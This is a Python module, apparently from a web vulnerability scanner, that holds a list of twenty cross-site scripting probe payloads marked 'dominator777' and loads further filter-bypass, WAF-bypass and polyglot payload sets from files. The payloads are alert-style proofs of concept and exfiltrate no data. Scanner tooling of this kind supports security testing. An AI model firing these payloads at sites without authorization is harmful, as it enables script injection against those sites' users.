"""
Enhanced XSS payload collection with context-aware detection
"""

from utils.payload_loader import PayloadLoader

class XSSPayloads:
    """Enhanced XSS payload collection with context-aware detection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic XSS payloads with dominator777 markers"""
        # Персонализированные XSS payload'ы с dominator777
        dominator_xss_payloads = [
            '<script>alert("dominator777_basic_001")</script>',
            '<scRipt>alert("dominator777_basic_002")</scRipt>',
            '<SCRIPT>alert("dominator777_basic_003")</SCRIPT>',
            '<script>confirm("dominator777_basic_004")</script>',
            '<script>prompt("dominator777_basic_005")</script>',
            '<img src=x onerror=alert("dominator777_img_001")>',
            '<svg onload=alert("dominator777_svg_001")>',
            '<iframe src="javascript:alert(\'dominator777_iframe_001\')"></iframe>',
            '<body onload=alert("dominator777_body_001")>',
            '<div onclick=alert("dominator777_div_001")>Click me</div>',
            'javascript:alert("dominator777_js_001")',
            '"><script>alert("dominator777_break_001")</script>',
            "'><script>alert('dominator777_break_002')</script>",
            '</script><script>alert("dominator777_break_003")</script>',
            '<input onfocus=alert("dominator777_input_001") autofocus>',
            '<select onfocus=alert("dominator777_select_001") autofocus>',
            '<textarea onfocus=alert("dominator777_textarea_001") autofocus>',
            '<marquee onstart=alert("dominator777_marquee_001")>',
            '<details open ontoggle=alert("dominator777_details_001")>',
            '<keygen onfocus=alert("dominator777_keygen_001") autofocus>'
        ]
        
        # Загрузить payload'ы из файла как fallback
        try:
            file_payloads = PayloadLoader.load_payloads('xss_basic')
            return dominator_xss_payloads + file_payloads[:10]  # Добавить первые 10 из файла
        except:
            return dominator_xss_payloads
    
    @staticmethod
    def get_advanced_payloads():
        """Get advanced XSS payloads from text file"""
        return (
            PayloadLoader.load_payloads('xss_filter_bypass') +
            PayloadLoader.load_payloads('xss_waf_bypass')
        )
    
    @staticmethod
    def get_all_payloads():
        """Get all XSS payloads including context-aware and DOM XSS payloads"""
        return (
            XSSPayloads.get_basic_payloads() +
            XSSPayloads.get_context_aware_payloads() +
            XSSPayloads.get_dom_xss_payloads() +
            XSSPayloads.get_filter_bypass_payloads() +
            XSSPayloads.get_polyglot_payloads()
        )
    
    @staticmethod
    def get_context_aware_payloads():
        """Get context-aware XSS payloads for different injection points"""
        return PayloadLoader.load_payloads('xss_context_aware')
    
    @staticmethod
    def get_dom_xss_payloads():
        """Get DOM XSS specific payloads"""
        return PayloadLoader.load_payloads('xss_dom')
    
    @staticmethod
    def get_filter_bypass_payloads():
        """Get filter bypass XSS payloads"""
        return PayloadLoader.load_payloads('xss_filter_bypass')
    
    @staticmethod
    def get_polyglot_payloads():
        """Get polyglot XSS payloads that work in multiple contexts"""
        return PayloadLoader.load_payloads('xss_polyglot')
    
    @staticmethod
    def get_waf_bypass_payloads():
        """Get WAF bypass XSS payloads"""
        return PayloadLoader.load_payloads('xss_waf_bypass')
    
    @staticmethod
    def get_event_handler_payloads():
        """Get event handler based XSS payloads"""
        return PayloadLoader.load_payloads('xss_event_handler')
